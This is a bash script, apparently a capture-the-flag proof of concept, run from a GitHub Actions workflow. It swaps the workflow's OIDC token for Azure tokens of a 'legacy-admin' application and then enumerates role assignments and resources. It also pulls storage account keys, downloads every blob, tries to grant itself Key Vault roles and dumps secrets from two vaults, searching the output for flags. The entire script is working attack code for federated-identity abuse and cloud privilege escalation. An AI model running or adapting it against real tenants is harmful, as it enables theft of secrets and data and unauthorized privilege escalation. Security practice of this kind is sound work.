#!/usr/bin/env bash
set +e
M="--max-time 30 --connect-timeout 10"
LEG="891fb158-e02c-4428-a885-53b811f369c0"
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
MGMT="https://management.azure.com"
SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
SECID="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
KVSU="4633458b-17de-408a-b874-0445c86b69e6"   # Key Vault Secrets User
KVAO="00482a5a-887f-4fb3-b363-3b7fe8e74483"   # Key Vault Administrator

dec(){ printf '%s' "$1" | cut -d. -f2 | tr '_-' '/+' | { read p; r=$(( ${#p} % 4 )); [ $r -ne 0 ] && p="$p$(printf '%0.s=' $(seq 1 $((4-r))))"; printf '%s' "$p"; } | base64 -d 2>/dev/null; }

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "our sub: $(dec "$OIDC" | jq -r '.sub')"

assume(){ curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$LEG" -d "grant_type=client_credentials" -d "scope=$1/.default" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC"; }

grepflag(){ printf '%s' "$1" | grep -aoE "DF26\{[^}]*\}" && echo "   *** FLAG ***"; }

echo "===== assume legacy-admin: MANAGEMENT ====="
MT=$(assume "$MGMT" | jq -r '.access_token // empty')
echo "mt len=${#MT}"
if [ -n "$MT" ]; then
  OID=$(dec "$MT" | jq -r '.oid'); echo "legacy-admin oid=$OID roles_claim=$(dec "$MT"|jq -rc '.roles // empty')"
  echo "--- role assignments ---"
  curl -sS $M -H "Authorization: Bearer $MT" "$MGMT/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$OID'" \
    | jq -r 'if .error then "ERR:"+.error.code else (.value[]? | "ROLE "+(.properties.roleDefinitionId|split("/")|last)+" @ "+.properties.scope) end'
  echo "--- resources visible ---"
  curl -sS $M -H "Authorization: Bearer $MT" "$MGMT/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=80" | jq -rc 'if .error then "ERR:"+.error.code else [.value[]?|{n:.name,t:.type}] end' | head -c 800; echo
  echo "--- try listKeys on storage accounts ---"
  for acc_rg in "sttblappcfgprodx3euoz:rg-tbl-platform-prod-sea" "sttblbackupprodx3euoz:rg-tbl-platform-prod-sea" "sttblarchiveprodx3euoz:rg-tbl-platform-prod-sea" "sttblcilogsprodx3euoz:rg-tbl-platform-prod-sea"; do
    acc=${acc_rg%%:*}; rg=${acc_rg##*:}
    KEY=$(curl -sS $M -X POST -H "Authorization: Bearer $MT" -H "Content-Length: 0" "$MGMT/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Storage/storageAccounts/$acc/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
    echo "  $acc listKeys -> ${KEY:+GOT(len ${#KEY})}${KEY:-DENIED}"
    if [ -n "$KEY" ]; then
      C=(--account-name "$acc" --account-key "$KEY" --only-show-errors -o tsv)
      for cont in $(az storage container list "${C[@]}" --query '[].name' 2>/dev/null); do
        for b in $(az storage blob list "${C[@]}" -c "$cont" --query '[].name' 2>/dev/null); do
          body=$(az storage blob download "${C[@]}" -c "$cont" -n "$b" -o tsv 2>/dev/null)
          echo "    [$acc/$cont/$b] ${body:0:200}"; grepflag "$body"
        done
      done
    fi
  done
  # self-grant path if Owner/UAA
  echo "--- attempt self-grant Key Vault Secrets User on kv-tbl-sec ---"
  GUID=$(cat /proc/sys/kernel/random/uuid)
  for RD in "$KVSU" "$KVAO"; do
    R=$(curl -sS $M -X PUT -H "Authorization: Bearer $MT" -H "Content-Type: application/json" \
      "$MGMT$SECID/providers/Microsoft.Authorization/roleAssignments/$GUID?api-version=2022-04-01" \
      -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$RD\",\"principalId\":\"$OID\"}}")
    echo "  grant $RD -> $(printf '%s' "$R" | jq -rc 'if .error then .error.code else "CREATED" end')"
  done
fi

echo "===== assume legacy-admin: VAULT (kv-tbl-sec + kv-tbl-prod) ====="
for i in 1 2; do
  VT=$(assume "https://vault.azure.net" | jq -r '.access_token // empty')
  echo "vt len=${#VT} (try $i)"
  if [ -n "$VT" ]; then
    for KVU in "$SECKV" "$PRODKV"; do
      echo "--- $KVU list+read ---"
      L=$(curl -sS $M -H "Authorization: Bearer $VT" "$KVU/secrets?api-version=7.4&maxresults=25")
      if printf '%s' "$L" | jq -e '.error' >/dev/null 2>&1; then echo "  list ERR: $(printf '%s' "$L"|jq -rc .error.code)";
      else for sid in $(printf '%s' "$L" | jq -r '.value[]?.id'); do
             v=$(curl -sS $M -H "Authorization: Bearer $VT" "$sid?api-version=7.4" | jq -r '.value // empty')
             echo "  $sid = $v"; grepflag "$v"
           done; fi
    done
  fi
  [ $i -eq 1 ] && { echo "(sleeping 40s for role propagation, then retry vault)"; sleep 40; }
done
echo "POC2 DONE"
